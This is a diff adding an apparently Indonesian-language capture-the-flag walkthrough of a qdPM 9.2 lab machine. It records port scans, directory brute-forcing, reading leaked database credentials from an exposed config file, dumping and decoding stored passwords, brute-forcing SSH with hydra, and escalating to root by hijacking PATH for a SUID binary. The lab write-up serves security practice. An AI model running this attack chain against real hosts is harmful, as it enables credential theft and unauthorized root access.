@@ -1,0 +1,332 @@
+start the machine
+Temukan  IP the machine
+sudo netdiscover -r
+IP = 192.168.1.11
+
+SCAN NMAP -sV -sC 192.168.1.11 -p-
+
+nmap -sV -sC 192.168.1.11 -p-
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 21:59 EDT
+Nmap scan report for 192.168.1.11
+Host is up (0.021s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
+|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
+|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
+80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
+|_http-title: qdPM | Login
+|_http-server-header: Apache/2.4.48 (Debian)
+3306/tcp  open  mysql   MySQL 8.0.26
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.26
+|   Thread ID: 39
+|   Capabilities flags: 65535
+|   Some Capabilities: IgnoreSigpipes, FoundRows, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, InteractiveClient, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: MuOd[\x1B5\x0E?\x1B89{#mVr-\x13\x1D
+|_  Auth Plugin Name: caching_sha2_password
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
+| Not valid before: 2021-09-25T10:47:29
+|_Not valid after:  2031-09-23T10:47:29
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-
+
+=====================================================================
+Cek Port 80
+dan lakukan dir search pada web tersebut
+gobuster dir -u 192.168.1.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.11
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php,html
+[+] Timeout:                 10s
+===============================================================
+2022/09/03 22:06:07 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 313] [--> http://192.168.1.11/images/]
+/index.php            (Status: 200) [Size: 5662]                                 
+/uploads              (Status: 301) [Size: 314] [--> http://192.168.1.11/uploads/]
+/css                  (Status: 301) [Size: 310] [--> http://192.168.1.11/css/]    
+/template             (Status: 301) [Size: 315] [--> http://192.168.1.11/template/]
+/core                 (Status: 301) [Size: 311] [--> http://192.168.1.11/core/]    
+/install              (Status: 301) [Size: 314] [--> http://192.168.1.11/install/] 
+/manual               (Status: 301) [Size: 313] [--> http://192.168.1.11/manual/]  
+/js                   (Status: 301) [Size: 309] [--> http://192.168.1.11/js/]      
+/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.11/javascript/]
+/check.php            (Status: 200) [Size: 0]                                        
+/sf                   (Status: 301) [Size: 309] [--> http://192.168.1.11/sf/]        
+/readme.txt           (Status: 200) [Size: 470]                                      
+/robots.txt           (Status: 200) [Size: 26]                                       
+Progress: 9576 / 882244 (1.09%)                                                     ^C
+[!] Keyboard interrupt detected, terminating.
+
+
+
+di sini terlihat ada index.php  berstatus 200  berati dapat di lihat 
+ada petunjuk baru (qdPM 9.2)  mari kita cek  kerentanan  pada qdPM 9.2 versu tersebut 
+http://<website>/core/config/databases.yml 
+
+ini adalah  jenis kerentanan pada versi  qdpm 9,2
+
+all:
+  doctrine:
+    class: sfDoctrineDatabase
+    param:
+      dsn: 'mysql:dbname=qdpm;host=localhost'
+      profiler: false
+      username: qdpmadmin
+      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
+      attributes:
+        quote_identifier: true  
+ 
+ 
+ Sekarang kita memilik akses ke Port 3306 (mysql) dengan username dan password sudah kita dapatkan
+ ─$ mysql -u qdpmadmin -h 192.168.1.11 -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 80
+Server version: 8.0.26 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+
+
+kita berhasil masuk dan kita  lihat apa saja database di sana
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| qdpm               |
+| staff              |
+| sys                |
++--------------------+
+6 rows in set (0.134 sec)
+
+kita fokus pada qdpm
+MySQL [qdpm]> show tables;
++----------------------+
+| Tables_in_qdpm       |
++----------------------+
+| attachments          |
+| configuration        |
+| departments          |
+| discussions          |
+| discussions_comments |
+| discussions_reports  |
+| discussions_status   |
+| events               |
+| extra_fields         |
+| extra_fields_list    |
+| phases               |
+| phases_status        |
+| projects             |
+| projects_comments    |
+| projects_phases      |
+| projects_reports     |
+| projects_status      |
+| projects_types       |
+| tasks                |
+| tasks_comments       |
+| tasks_groups         |
+| tasks_labels         |
+| tasks_priority       |
+| tasks_status         |
+| tasks_types          |
+| tickets              |
+| tickets_comments     |
+| tickets_reports      |
+| tickets_status       |
+| tickets_types        |
+| user_reports         |
+| users                |
+| users_groups         |
+| versions             |
+| versions_status      |
++----------------------+
+35 rows in set (0.023 sec)
+
+MySQL [qdpm]> select * from users;
+Empty set (0.182 sec)
+
+MySQL [qdpm]> 
+
+
+tidak menemukan apa2, sekarang kita coba eksekusi database staff;
+MySQL [staff]> show tables;
++-----------------+
+| Tables_in_staff |
++-----------------+
+| department      |
+| login           |
+| user            |
++-----------------+
+3 rows in set (0.059 sec)
+
+MySQL [staff]> select * from login;
++------+---------+--------------------------+
+| id   | user_id | password                 |
++------+---------+--------------------------+
+|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
+|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
+|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
+|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |s
+|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
++------+---------+--------------------------+
+5 rows in set (0.158 sec)
+
+ada 5 password yang sudah di encript
+MySQL [staff]> select * from user;
++------+---------------+--------+---------------------------+
+| id   | department_id | name   | role                      |
++------+---------------+--------+---------------------------+
+|    1 |             1 | Smith  | Cyber Security Specialist |
+|    2 |             2 | Lucas  | Computer Engineer         |
+|    3 |             1 | Travis | Intelligence Specialist   |
+|    4 |             1 | Dexter | Cyber Security Analyst    |
+|    5 |             2 | Meyer  | Genetic Engineer          |
++------+---------------+--------+---------------------------+
+5 rows in set (0.366 sec)
+
+kita mendapatkan 5 username 
+
+
+hasil encode password
+
+suRJAdGwLp8dy3rF
+7ZwV4qtg42cmUXGX
+X7MQkP3W29fewHdC
+DJceVy98W28Y7wLg
+cqNnBWCByS2DuJSy
+
+sekarang kita coba bruteforce ssh dengan tools  HYDRA dengan list 5 user yang kita dapatkan dan 5 password yang sudah kita Encode
+
+hydra -L user.txt  -P hash.txt  ssh://192.168.1.11 -f   ( -f di sini biar bertujuan biar proses cepat )
+
+ hydra -L user.txt -P hash.txt ssh://192.168.1.11 -f
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-03 22:26:29
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:3/p:5), ~1 try per task
+[DATA] attacking ssh://192.168.1.11:22/
+[22][ssh] host: 192.168.1.11   login: travis   password: DJceVy98W28Y7wLg
+[STATUS] attack finished for 192.168.1.11 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-03 22:26:32
+  
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-03 22:24:37
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:2/p:5), ~1 try per task
+[DATA] attacking ssh://192.168.1.11:22/
+[22][ssh] host: 192.168.1.11   login: dexter   password: 7ZwV4qtg42cmUXGX
+[STATUS] attack finished for 192.168.1.11 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-03 22:24:39
+ 
+                       
+                         
+Di sii saya sudah mendapatkan 2 user 
+
+
+[22][ssh] host: 192.168.1.11   login: travis   password: DJceVy98W28Y7wLg
+
+[22][ssh] host: 192.168.1.11   login: dexter   password: 7ZwV4qtg42cmUXGX
+
+=================================
+
+
+sekrang kita login SSH
+dengan cara   sshtravis@192.168.1.11
+ssh travis@192.168.1.11
+travis@192.168.1.11's password: 
+Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Sep  3 09:53:46 2022 from 192.168.1.4
+travis@debian:~$ ls
+user.txt
+travis@debian:~$ cat user.txt 
+ICA{Secret_Project}
+
+kita dapat 1 flag  ICA{Secret_Project}
+
+kita coba login ke ssh ke 2
+
+ sshdexter@192.168.1.11
+ 
+ lakukan pencarian binary  
+ find /-perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+
+ada yang mearik yaitu strings /opt/get-access
+
+echo $PATH
+echo '/bin/bash' >> /tmp/cat
+export PATH=/tmp:$PATH
+echo $PATH
+chmod +x /tmp/cat
+/opt/get_access
+
+
+fungsi di atas  bertujuan untuk membuat path berpidah dan mengangap kita adala root ini untuk memanipulasi sistem linux
+dexter@debian:~$ find /-perm -4000 -type f -exec ls -la {} 2>/dev/null\;
+-bash: /dev/null;: Permission denied
+dexter@debian:~$ find /-perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+dexter@debian:~$ strings /opt/get-access
+strings: '/opt/get-access': No such file
+dexter@debian:~$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+dexter@debian:~$ echo '/bin/bash' >> /tmp/cat
+dexter@debian:~$ export PATH=/tmp:$PATH
+dexter@debian:~$ echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+dexter@debian:~$ chmod +x /tmp/cat
+dexter@debian:~$ opt/get_access
+-bash: opt/get_access: No such file or directory
+dexter@debian:~$ /opt/get_access
+root@debian:~# ^C
+root@debian:~# 
+
+
+DONE!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+
+
+
+
+
